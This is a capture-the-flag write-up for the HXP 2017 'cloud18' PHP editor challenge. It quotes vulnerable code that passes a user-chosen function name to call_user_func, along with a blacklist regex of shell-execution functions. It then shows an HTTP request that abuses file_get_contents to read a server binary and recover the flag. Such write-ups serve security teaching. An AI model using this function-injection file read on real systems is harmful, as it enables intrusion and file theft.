---
layout: page
title: "HXP 2017 Writeup: cloud18"
---

> cloud18
> 
> We also did an online text editor! We also made it, like, super secure! We are so confident that we even give you the source code.
> 
> Download:
>
> [cloud18.zip]({{ site.baseurl }}/ctfs/hxp2017/cloud18/cloud18.zip)
>
> Connection:
> 
> http://35.198.105.111:5475/
> 
> 150 Basepoints + 100 Bonuspoints * min(1, 3/78 Solves) = 153 Points

As we explore the site and look at the source we can see that we can register as a user and log in; once logged in we can do some simple operations like changing text into upper case. The following line in ```editor.php``` looks suspicious:

```php
    $editedText = preg_replace_callback("/" . $_POST["regex"] . "/", function ($matches) {
        return call_user_func($_POST["method"], $matches[0]);
    }, $_POST["text"]);
```

Looks like we can specify a PHP function in the ```method``` field and have it executed. Looks pretty dangerous. Of course the author built in some protections:

```php
if (preg_match("/exec|system|passthru|`|proc_open|popen/", strtolower($_POST["method"].$_POST["text"])) != 0) {
    exit("Do you really think you could pass something to the command line? Functions like this are often disabled! Maybe have a look at the source?");
}
```

Black lists don't work very well in security. :smile: We can use a wide range of PHP functions here, for example the one that will embed a file in the generated page - ```file_get_contents```. Let's send a request with that method and try to get the executable that generates the flag:

```http
POST http://35.198.105.111:5475/editor.php HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 56
Cache-Control: max-age=0
Origin: http://35.198.105.111:5475
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://35.198.105.111:5475/editor.php
Accept-Language: en-gb
Cookie: PHPSESSID=n89duqqmdedqvlo0fjb7nqu6t4
Host: 35.198.105.111:5475

method=file_get_contents&regex=.*&text=/usr/bin/get_flag
```

Bingo!

```http
HTTP/1.1 200 OK
Date: Sun, 19 Nov 2017 00:16:28 GMT
Server: Apache/2.4.25 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Editor</title>
    <meta charset="UTF-8">
    <link rel="stylesheet" type="text/css" href="stylesheet.css">
</head>
<body>
<div id="page-wrap">
    <h1>cloud18 Editor - Your better development environment, in the cloud</h1>
    <p>Powerful Workspaces - All the freedom you'd expect!</p>
    <div id="menu">
        <a href='/logout.php'>logout</a>    </div>
    <div class='alert success'>.ELF.....
...
```

When we save the embedded file as a local binary and run it we get the flag:

```
$ ./get_flag
hxp{Th1s_w2sn't_so_h4rd_now_do_web_of_ages!!!Sorry_f0r_f1rst_sh1tty_upload}
```

